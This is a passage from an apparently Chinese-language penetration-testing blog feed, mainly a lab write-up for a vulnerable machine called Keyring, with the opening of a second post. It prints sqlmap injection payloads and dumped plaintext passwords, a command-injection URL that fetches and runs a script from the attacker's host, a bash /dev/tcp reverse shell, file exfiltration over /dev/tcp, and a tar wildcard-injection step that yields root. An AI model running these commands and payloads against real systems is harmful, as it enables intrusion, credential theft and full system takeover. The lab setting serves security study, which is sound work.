class="keyword">to</span> the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) <span class="keyword">from</span> stored session:</span><br><span class="line">---</span><br><span class="line">Parameter:<span class="built_in"> user </span>(GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 <span class="keyword">AND</span> time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="attribute">user</span>=kakeru&#x27; <span class="keyword">AND</span> (SELECT 9710 <span class="keyword">FROM</span> (SELECT(SLEEP(5)))Gxfh) <span class="keyword">AND</span> <span class="string">&#x27;flol&#x27;</span>=<span class="string">&#x27;flol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27;</span> UNION ALL SELECT CONCAT(0x7178787871,0x65647271467a6477744472684547474a74614e4e59464276706668634d4f4d5576495a45414a6b72,0x717a6a7a71)-- -</span><br><span class="line">---</span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] the back-end DBMS is MySQL</span><br><span class="line">web<span class="built_in"> server </span>operating system: Linux Ubuntu 18.04 (bionic)</span><br><span class="line">web application technology: Apache 2.4.29</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;users&#x27;</span></span><br><span class="line">[20:55:58] [<span class="built_in">WARNING</span>] reflective value(s) found <span class="keyword">and</span> filtering out</span><br><span class="line">Database:<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span>[2 tables]</span><br><span class="line">+---------+</span><br><span class="line">| log     |</span><br><span class="line">| details |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">[20:55:58] [<span class="built_in">INFO</span>] fetched data logged <span class="keyword">to</span> text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.240.230&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 20:55:57 /2025-02-06/</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# sqlmap -u 192.168.240.230/history.php?<span class="attribute">user</span>=kakeru <span class="attribute">--cookie</span>=<span class="string">&quot;PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span> --batch -D<span class="built_in"> users </span>-T details --columns --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.12#stable&#125;</span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 20:56:16 /2025-02-06/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:56:16] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[20:56:16] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: user (GET)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27; AND (SELECT 9710 FROM (SELECT(SLEEP(5)))Gxfh) AND &#x27;flol&#x27;=&#x27;flol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27; UNION ALL SELECT CONCAT(0x7178787871,0x65647271467a6477744472684547474a74614e4e59464276706668634d4f4d5576495a45414a6b72,0x717a6a7a71)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Ubuntu 18.04 (bionic)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.29</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetching columns for table &#x27;details&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">[20:56:16] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">Table: details</span></span><br><span class="line"><span class="string">[2 columns]</span></span><br><span class="line"><span class="string">+----------+-------------+</span></span><br><span class="line"><span class="string">| Column   | Type        |</span></span><br><span class="line"><span class="string">+----------+-------------+</span></span><br><span class="line"><span class="string">| name     | varchar(20) |</span></span><br><span class="line"><span class="string">| password | varchar(22) |</span></span><br><span class="line"><span class="string">+----------+-------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetching columns for table &#x27;details&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetching entries for table &#x27;details&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">Table: details</span></span><br><span class="line"><span class="string">[3 entries]</span></span><br><span class="line"><span class="string">+--------+-----------------------+</span></span><br><span class="line"><span class="string">| name   | password              |</span></span><br><span class="line"><span class="string">+--------+-----------------------+</span></span><br><span class="line"><span class="string">| admin  | myadmin#p4szw0r4d     |</span></span><br><span class="line"><span class="string">| john   | Sup3r<span class="variable">$S3cr3t</span><span class="variable">$PasSW0RD</span> |</span></span><br><span class="line"><span class="string">| kakeru | kakeru                |</span></span><br><span class="line"><span class="string">+--------+-----------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:56:16] [INFO] table &#x27;users.details&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.240.230/dump/users/details.csv&#x27;</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.240.230&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 20:56:16 /2025-02-06/</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
<p>è·å–åˆ°adminå¯†ç ä¹‹åç™»å½•ï¼Œç„¶ååœ¨control.phpè¿™é‡Œç”¨?cmdcntræ‰§è¡Œå‘½ä»¤åå¼¹webshell<br>æˆ‘å…ˆè¯•äº†ncçš„åå¼¹shellï¼Œä½†æ˜¯ä¸è¡Œï¼Œæ‰€ä»¥ä¸Šä¼ ä¸€ä¸ªåå¼¹shellçš„php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">cp</span> /usr/share/webshells/php/php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php .        </span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">ls</span></span><br><span class="line"><span class="number">51224</span>.<span class="keyword">py</span>  aaa    <span class="keyword">b</span>    <span class="keyword">b</span>.txt  id_rsa    php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php  reports     rockyou.txt</span><br><span class="line"><span class="keyword">a</span>         <span class="keyword">a</span>.txt  bbb  id     pass.txt  pspy64                 <span class="built_in">reverse</span>.<span class="keyword">sh</span>  tmp</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">python3</span> -<span class="keyword">m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">80</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span>/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯è¿™æ ·è™½ç„¶æ¥æ”¶åˆ°äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“æ¥æ”¶ä¹‹åçš„è·¯å¾„ï¼Œä¹Ÿæ²¡æ³•å¼¹shell<br>æˆ‘ä¸€å¼€å§‹ç”¨php-reverse-shell.php,ä¸€ç›´æ²¡æˆåŠŸè®¿é—®åˆ°è·¯å¾„ï¼Œåé¢ç»è¿‡ç¾¤ä¸»æé†’ï¼Œç›´æ¥ç”¨phpå°±å¯ä»¥æ‰§è¡Œã€‚<br>è¿˜å¯ä»¥å…ˆè¾“å…¥å‘½ä»¤ls -alçœ‹çœ‹æƒé™<br>é‚£å°±ç”¨reverse.shæ¥åå¼¹shell å†™åˆ°&#x2F;tmpç›®å½•ä¸­ï¼Œå½“å‰ç›®å½•ä¸€èˆ¬éƒ½æ˜¯rootåˆ›çš„æ²¡æœ‰æƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.240.230</span>/control.php?cmdcntr=wget%<span class="number">20192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">11</span>/reverse.sh%<span class="number">20</span>-O%<span class="number">20</span>/tmp/re.sh</span><br><span class="line"><span class="attribute">http</span>://<span class="number">192.168.240.230</span>/control.php?cmdcntr=bash%<span class="number">20</span>/tmp/re.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">                                                                                                                  </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># cat reverse.sh                                                            </span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">240.11</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1234</span></span><br><span class="line">id</span><br><span class="line">pwd</span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">627</span>): <span class="title class_">Inappropriate</span> ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>pwd</span><br><span class="line">/var/www/html</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>ç¾åŒ–ç»ˆç«¯ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">ctrl + zæŒ‚èµ·</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line">xterm</span><br><span class="line">æœ¬æœº<span class="built_in">stty</span> -a æŸ¥çœ‹è‡ªå·±çš„  rows columns</span><br><span class="line"><span class="built_in">stty</span>  rows 35 columns 115</span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>sudo å’Œ suidéƒ½æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>sudp -l</span><br><span class="line"></span><br><span class="line"><span class="title class_">Command</span> <span class="string">&#x27;sudp&#x27;</span> <span class="keyword">not</span> found, did you <span class="symbol">mean:</span></span><br><span class="line"></span><br><span class="line">  command <span class="string">&#x27;ssdp&#x27;</span> from snap ssdp</span><br><span class="line">  command <span class="string">&#x27;sfdp&#x27;</span> from deb graphviz</span><br><span class="line">  command <span class="string">&#x27;sup&#x27;</span> from deb sup</span><br><span class="line">  command <span class="string">&#x27;sudo&#x27;</span> from deb sudo</span><br><span class="line">  command <span class="string">&#x27;sudo&#x27;</span> from deb sudo-ldap</span><br><span class="line"></span><br><span class="line"><span class="title class_">See</span> <span class="string">&#x27;snap info &lt;snapname&gt;&#x27;</span> <span class="keyword">for</span> additional versions.</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>sudo -l</span><br><span class="line"></span><br><span class="line"><span class="title class_">We</span> trust you have received the usual lecture from the local <span class="title class_">System</span></span><br><span class="line"><span class="title class_">Administrator</span>. <span class="title class_">It</span> usually boils down to these three <span class="symbol">things:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> www-<span class="symbol">data:</span> </span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line"><span class="symbol">sudo:</span> <span class="number">1</span> incorrect password attempt</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-<span class="number">1</span>/polkit-agent-helper-<span class="number">1</span></span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/su</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å»homeç›®å½•ä¸‹é¢ï¼Œå‘ç°æœ‰ä¸€ä¸ªjohnç”¨æˆ·ï¼Œåˆšæ‰sqlmapä¹Ÿæœ‰è¿™ä¸ªç”¨æˆ·ï¼<br>å¯ä»¥åˆ‡æ¢åˆ°è¿™ä¸ªç”¨æˆ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/</span><span class="variable">$ </span>cd home</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">john</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/home</span><span class="variable">$ </span>su - john</span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line"><span class="title class_">To</span> run a command as administrator (user <span class="string">&quot;root&quot;</span>), <span class="keyword">use</span> <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line"><span class="title class_">See</span> <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>å‘ç°johnè‡ªå·±ç›®å½•ä¸‹çš„ä¸€ä¸ªæ–‡ä»¶æœ‰suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">john<span class="variable">@keyring</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/home/john</span><span class="regexp">/compress</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/snapd</span><span class="regexp">/snap-confine</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/x</span>86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/policykit-1/polkit</span>-agent-helper-<span class="number">1</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/traceroute</span>6.iputils</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newuidmap</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/pkexec</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgidmap</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/bin/ntfs</span>-<span class="number">3</span>g</span><br><span class="line"><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/bin/ping</span></span><br><span class="line"><span class="regexp">/bin/fusermount</span></span><br><span class="line"><span class="regexp">/bin/su</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªæ˜¯ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘åˆå¡ä½äº†<br>çœ‹äº†è§†é¢‘ï¼ŒçŸ¥é“ç”¨stringçœ‹è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1234 &gt; compress</span></span><br><span class="line"></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>cat compress &gt; /dev/tcp/<span class="number">192.168</span>.<span class="number">240.11</span>/<span class="number">1234</span></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># strings compress             </span></span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64</span>.so.<span class="number">2</span></span><br><span class="line">libc.so.<span class="number">6</span></span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line"><span class="title class_">GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u+<span class="title class_">UH</span></span><br><span class="line">[]A\A]A^<span class="title class_">A_</span></span><br><span class="line">/bin/tar cf archive.tar *</span><br><span class="line"><span class="symbol">:*</span><span class="number">3</span><span class="variable">$&quot;</span></span><br><span class="line"><span class="symbol">GCC:</span> (<span class="title class_">Ubuntu</span> <span class="number">9.3</span>.<span class="number">0</span><span class="number">-17</span>ubuntu1~<span class="number">20.04</span>) <span class="number">9.3</span>.<span class="number">0</span></span><br><span class="line">crtstuff.c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.<span class="number">8060</span></span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">tar.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_edata</span><br><span class="line">system<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__libc_start_main<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setgid<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">setuid<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__cxa_finalize<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.<span class="title class_">ABI</span>-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.plt.sec</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure></div>
<p>ä¸»è¦æ˜¯ç”¨åˆ°äº†<code>/bin/tar cf archive.tar *</code> æˆ‘ä»¬è¿è¡Œä¹‹åç›®å½•ä¸‹å°±ä¼šå‡ºç°archive.tar<br>åœ¨gifobinsæ‰¾åˆ°åˆ©ç”¨æ–¹å¼<br><img src="https://pic1.imgdb.cn/item/67a4c7dbd0e0a243d4fc5424.png"><br>åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>wget <span class="number">192.168</span>.<span class="number">240.11</span>/reverse.sh </span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>touch -- <span class="string">&quot;--checkpoint=1&quot;</span></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>touch -- <span class="string">&quot;--checkpoint-action=exec=bash  reverse.sh&quot;</span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1234           </span></span><br><span class="line">id</span><br><span class="line"><span class="title class_">To</span> run a command as administrator (user <span class="string">&quot;root&quot;</span>), <span class="keyword">use</span> <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line"><span class="title class_">See</span> <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">root<span class="variable">@keyring</span><span class="symbol">:~</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">108</span>(lxd),<span class="number">113</span>(lpadmin),<span class="number">114</span>(sambashare),<span class="number">1000</span>(john)</span><br><span class="line">root<span class="variable">@keyring</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>äº†è§£äº†è¿™é‡Œâ€“æ˜¯å‘Šè¯‰touchåé¢ä¸æ˜¯å‚æ•°ï¼Œä¸ç”¨è¯†åˆ«å› ä¸ºæ–‡ä»¶ä¸­å¸¦â€“</p>
<p>æ€»ç»“ï¼šè¿™ä¸ªé¶æœºæˆ‘å¡äº†å¥½ä¹…ï¼Œä¹Ÿç®—å­¦äº†ä¸å°‘ä¸œè¥¿ï¼Œä»¥åéƒ½ç”¨gobusteræ‰«ç›®å½•ï¼Œå­¦äº†wfuzzçˆ†ç ´å‚æ•°ï¼Œæºç æ³„æ¼ä½¿ç”¨git logå’Œgit diffæ‰¾å‡ºå†å²ç‰ˆæœ¬çš„ä¸åŒã€‚æœ€åææƒç¨å¾®ä¿®æ”¹ä¸‹pocå°±å¯ä»¥äº†</p>
<p>ç¾¤ä¸»å¤ç›˜è§†é¢‘åœ°å€ï¼š<a href="https://www.bilibili.com/video/BV17iP6eLEP2/?spm_id_from=333.1387.upload.video_card.click&vd_source=2971771be3c690f4dabe696dc01299f2">https://www.bilibili.com/video/BV17iP6eLEP2/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=2971771be3c690f4dabe696dc01299f2</a></p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Listen</title>
    <url>/posts/24112.html</url>
    <content><![CDATA[<p>HMV-Listené¶åœºå¤ç›˜<br>æœ¬æ¥æƒ³å…ˆåšVulnyxçš„Listenä½†æ˜¯æˆ‘ç”¨å¹³æ—¶çš„æ–¹æ³•ä¿®æ”¹ä¸äº†ipï¼Œåšä¸äº†</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a6bd2bd0e0a243d4fcdfd2.png"></p>
